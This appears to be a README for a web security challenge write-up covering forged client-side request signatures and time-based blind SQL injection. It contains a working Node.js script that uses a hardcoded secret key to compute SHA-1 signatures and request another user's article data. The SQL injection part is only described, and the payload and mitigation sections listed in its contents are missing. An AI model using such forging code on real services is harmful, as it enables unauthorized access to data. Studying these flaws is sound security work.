# Web Application Security Challenges: Signed URL Exploitation & Blind SQL Injection (Time-Based)

This repository showcases the exploitation of two common web application vulnerabilities:

1. **Signed URL Exploitation**  
2. **Blind SQL Injection (Time-Based)**  

These vulnerabilities are common in real-world applications and demonstrate techniques used in bug bounty programs and penetration testing engagements.

---

## Table of Contents

- [Signed URL Exploitation](#signed-url-exploitation)
    - [Challenge Overview](#challenge-overview)
    - [Reversing the Obfuscated JavaScript](#reversing-the-obfuscated-javascript)
    - [Example Code to Forge Signed Request](#example-code-to-forge-signed-request)
    - [Security Implications](#security-implications)
    - [Mitigation Strategies](#mitigation-strategies)
  
- [Blind SQL Injection (Time-Based)](#blind-sql-injection-time-based)
    - [Challenge Overview](#challenge-overview-1)
    - [Exploiting the Time-Based Blind SQL Injection](#exploiting-the-time-based-blind-sql-injection)
    - [SQL Injection Payloads](#sql-injection-payloads)
    - [Security Implications](#security-implications-1)
    - [Mitigation Strategies](#mitigation-strategies-1)

---

## Signed URL Exploitation

### Challenge Overview
In this challenge, we explore a vulnerability where a web application generates cryptographic signatures for each API request to ensure that the URL and parameters cannot be tampered with. The signature process, however, is done client-side via JavaScript, which can be exploited by reverse-engineering the signature logic and crafting our own valid signed requests.

### Reversing the Obfuscated JavaScript
Upon intercepting requests, we found that the **Sign** and **Time** headers were being generated dynamically in the client-side JavaScript. The values were obfuscated to prevent easy understanding. Using browser developer tools, we analyzed the obfuscated code and reverse-engineered the signature generation logic.

After inspecting the obfuscated code and setting breakpoints, we identified how the signature was created using the SHA-1 hashing algorithm and how the request parameters were included in the signature string.

### Example Code to Forge Signed Request
The following example demonstrates how we can forge a valid signed request by calculating the signature and sending a modified request to retrieve sensitive data:

```javascript
const axios = require('axios');
const sha1 = require('js-sha1');

// Function to calculate the signature
function calculateSignature(timestamp, pathName, userId) {
    const secretKey = "pE5CRmAhC8fvaWy6u58tKDTEKCZyTKLA";
    const signatureString = [
        secretKey,
        timestamp,
        pathName,
        userId
    ].join('\n');
    return sha1(signatureString);
}

// Function to send the forged request
async function sendModifiedRequest() {
    const timestamp = Date.now().toString();
    const path = '/api/article?id=3';  // Target Article ID
    const userId = '379578839';

    const sign = calculateSignature(timestamp, path, userId);

    try {
        const response = await axios.get('https://[target-url]/api/article?id=3', {
            headers: {
                'Host': '[host-url]',
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0',
                'Sign': sign,
                'Time': timestamp,
                'User-Id': userId
            }
        });

        console.log('✅ Response data:', response.data);
    } catch (error) {
        console.error('❌ Error:', error.response?.data || error.message);
    }
}

sendModifiedRequest();
```

### Security Implications:

1. Client-Side Signature Generation: If signatures are generated on the client-side, attackers can reverse engineer the logic and forge requests.

2. Obfuscation: Obfuscation does not protect the signature generation logic. Attackers can still reverse it.

## Blind SQL Injection (Time-Based):

In this challenge, we perform a Blind SQL Injection (Time-Based) attack on a vulnerable web application after the signature process. This attack allows us to extract data from the database by exploiting time delays caused by SQL queries. The idea is to send a payload that causes the server to delay its response (e.g., using SLEEP) and use the timing of the response to infer data about the database.

### Exploiting the Time-Based Blind SQL Injection
To exploit a time-based blind SQL injection, we inject a payload into an application endpoint that takes user input and send the modified request. The server's response time changes based on the result of our injected query, allowing us to deduce information about the database structure and its contents.

# Conclusion
This repository showcases the exploitation of two major web application vulnerabilities:

Signed URL Exploitation: How attackers can forge signed requests by reverse engineering client-side logic.

Blind SQL Injection (Time-Based): A method to dump sensitive data from a vulnerable database by leveraging time-based delays.

# How to run:

```bash
npm install axios js-sha1
```